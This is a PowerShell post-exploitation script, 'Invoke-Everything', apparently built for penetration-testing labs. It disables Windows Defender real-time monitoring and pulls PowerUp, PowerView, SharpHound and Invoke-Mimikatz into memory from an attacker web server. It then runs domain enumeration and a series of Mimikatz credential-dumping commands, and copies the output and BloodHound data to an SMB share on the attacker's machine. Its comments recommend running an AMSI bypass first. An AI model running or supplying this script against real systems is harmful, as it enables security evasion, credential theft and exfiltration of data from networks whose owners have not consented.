function Invoke-Everything
{
<#
The following Script runs different powershell scripts in memory, this means they are not put on the local disk itself. Before running the script run an AMSI bypass to ensure scripts
will run properly. All Scripts are downloaded from your attacker machine IP address on Port 80, which means you will have to run a web server such as:

sudo python3 -m http.server 80

You will also need to ensure that the following scripts are in the same directory the web server is running:

PowerUp.ps1
PowerView_Dev.ps1
Invoke-Mimikatz.ps1
SharpHound.ps1

Output will be saved to invoke.txt

Start SMB Server on Attacker Machine to allow for the invoke.txt file to be moved back to you:

smbserver.py -smb2support share .

To run Script Invoke-Everything -attackerip <kali ip>

#>
      [cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP

    )
    if ($AttackerIP)
    {
    "`n[*] Time to walk away, the following script will take a few minutes to run, if getting errors that is ok, let the script continue"

    "`n[*] Running whoami, whoami /priv and whoami /groups"
    
    whoami > invoke.txt; whoami /priv >> invoke.txt; whoami /groups >> invoke.txt; `

   "`n`n[*] Running systeminfo"
    systeminfo >> invoke.txt; `

    "`n`n[*] Trying to Disable Real Time Monitoring"
    Set-MpPreference -DisableRealtimeMonitoring $true

    "`n`n[*] Running PowerUp with Invoke-AllChecks"
    Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerUp.ps1"); invoke-allchecks >> invoke.txt; `

    "`n`n[*] Running PowerView with get-netdomaincontoller, get-netuser, logged on users, preauthnotrequired, delegation "
    Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerView_Dev.ps1"); Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerView.ps1"); get-netdomaincontroller >> invoke.txt; get-netuser >> invoke.txt; `
    get-netloggedon >> .\Invoke.txt; get-loggedonlocal >> .\Invoke.txt; get-lastloggedon >> .\Invoke.txt; `
    get-netcomputer -unconstrained >> .\Invoke.txt; get-domainuser -trustedtoauth >> .\Invoke.txt; `
    
    "`n`n[*] Attempting to run SharpHound.ps1 Kali Bloodhound may NOT work with sharphound, ensure you have version 3.0.5 to run properly (can download for Windows if need be) Remember you will also need Neo4j"

    Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/SharpHound.ps1"); Invoke-BloodHound -collectionmethod All

    "`n`n[*] Attempting to copy Invoke.txt to SMB Share at Attacker IP"
    cp invoke.txt \\$AttackerIP\share 

    "`n`n[*] Attempting to copy BloodHound Zip to SMB Share at Attacker IP"

    cp *.zip \\$AttackerIP\share
    cp *.bin \\$AttackerIP\share

    }
    else
    {
    'Need an IP address'
    }

"`n`n[*] Attempting to see if current user is Administrator, if so running Invoke-Mimikatz"

function Check-IsElevated
    {
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$p = New-Object System.Security.Principal.WindowsPrincipal($id)
if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
  {Write-Output $True}

else
  
  {Write-Output $False}
    }
if(-not(Check-IsElevated))

{Throw "Not an Administrator will not run Invoke-Mimikatz"}

else
{
Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::lsa /patch" "vault::cred" "vault::cred /patch" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "sekurlsa::dpapi" "kerberos::list /export"' > mimi.txt

"`n`n[*] Wrote Invoke-Mimikatz to mimi.txt"
"`n`n[*] Attempting to copy mimi.txt to SMB share at Attacker IP"

cp mimi.txt \\$AttackerIP\share

}

}
